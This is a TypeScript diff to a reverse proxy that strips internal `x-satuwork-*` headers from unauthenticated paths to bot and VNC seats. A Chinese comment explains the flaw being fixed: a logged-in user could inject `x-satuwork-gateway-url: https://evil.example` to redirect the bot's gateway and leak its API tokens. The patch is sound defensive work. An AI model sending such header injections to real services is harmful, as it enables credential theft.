@@ -296,12 +296,30 @@ function pipeLanding(
   req.pipe(upstream)
 }
 
-export function forwardHeaders(req: IncomingMessage, port: number): Record<string, string | string[]> {
+/**
+ * 往席位转发时带哪些头。
+ *
+ * `trusted` 只在**验过机器票**的那几条路上给 true（`/bot`、Gateway 反代过来的 `/vnc`）：
+ * 说话的是 Gateway，它拼在请求上的 `x-satuwork-*`（眼下就是 `x-satuwork-gateway-url`，见
+ * bot/src/gateway-url.ts）要原样递到 bot。
+ *
+ * 其余的路（浏览器直连的 stream、票/cookie 进来的 vnc 和它的 WebSocket、本机工人的中继）
+ * **一个 `x-satuwork-*` 都不许往下走**。这几条路上管家验的是登录 JWT / 桌面票 / 工人令牌，
+ * 然后**替调用方换上席位的 `sat_`**——bot 那头看到的是一张对的席位票，分不出这一跳其实是
+ * 谁。之前这里原样透传，于是任何一个登录了的人带上
+ * `x-satuwork-gateway-url: https://evil.example` 走一次直连流，bot 就把 GATEWAY_URL 永久
+ * 改过去，此后每一次模型调用都把 GATEWAY_TOKEN / GATEWAY_API_KEY 送到别人手里。
+ *
+ * 按前缀摘而不是只摘那一个：这组头是 Gateway ↔ 管家 ↔ bot 之间自己的约定，外人没有任何
+ * 理由说，以后加一个新的也不该每次都记得回来这里补一行。
+ */
+export function forwardHeaders(req: IncomingMessage, port: number, trusted = false): Record<string, string | string[]> {
   const headers: Record<string, string | string[]> = {}
   for (const [k, v] of Object.entries(req.headers)) {
     if (v === undefined) continue
     // hop-by-hop 与我们自己的鉴权头不往下传；host 要换成上游的。
     if (k === 'host' || k === 'connection' || k === 'x-satuwork-machine' || k === 'cookie') continue
+    if (!trusted && k.startsWith('x-satuwork-')) continue
     headers[k] = v
   }
   headers.host = `127.0.0.1:${port}`
@@ -485,7 +503,7 @@ export function proxyIntercept(deps: ProxyDeps) {
         json(res, 404, { error: '没有这个席位' })
         return true
       }
-      pipeUpstream(req, res, row.botPort, (bot[2] || '/') + url.search, forwardHeaders(req, row.botPort))
+      pipeUpstream(req, res, row.botPort, (bot[2] || '/') + url.search, forwardHeaders(req, row.botPort, true))
       return true
     }
 
@@ -509,7 +527,7 @@ export function proxyIntercept(deps: ProxyDeps) {
      * 浏览器直连那条路没变，下面原样留着：管理员从后台点进来还走它。
      */
     if (machineTokenOk(req, deps.machineToken())) {
-      pipeUpstream(req, res, row.novncPort, rest + url.search, forwardHeaders(req, row.novncPort))
+      pipeUpstream(req, res, row.novncPort, rest + url.search, forwardHeaders(req, row.novncPort, true))
       return true
     }
     const ticket = url.searchParams.get('ticket')
@@ -629,7 +647,8 @@ export function attachUpgrade(server: Server, deps: ProxyDeps) {
       // 浏览器直连那条路上票在**路径**里（VNC_TICKET_PATH），cookie 只是兜底——
       // 桌面端（WKWebView）那边跨站 cookie 一律带不上，全靠路径这一份。
       const inPath = VNC_TICKET_PATH.exec(vnc[2] || '/')
-      if (!machineTokenOk(req, deps.machineToken())) {
+      const viaMachine = machineTokenOk(req, deps.machineToken())
+      if (!viaMachine) {
         const ok = inPath
           ? await verifyTicket(decodeURIComponent(inPath[1]), deps.gatewayUrl())
           : await (async () => {
@@ -642,7 +661,8 @@ export function attachUpgrade(server: Server, deps: ProxyDeps) {
       // `connection` 在普通反代里是 hop-by-hop，要摘掉；但在升级请求里它**就是**
       // 那个把请求变成升级的头。摘了上游不会发 101，Node 的客户端也不会触发
       // 'upgrade' 事件，表现就是干等到超时。所以这里补回去。
-      const headers = forwardHeaders(req, row.novncPort)
+      // 票/cookie 进来的是浏览器，`x-satuwork-*` 一律摘掉（见 forwardHeaders）。
+      const headers = forwardHeaders(req, row.novncPort, viaMachine)
       headers.connection = 'Upgrade'
       headers.upgrade = String(req.headers.upgrade || 'websocket')
       const upstream = httpRequest({
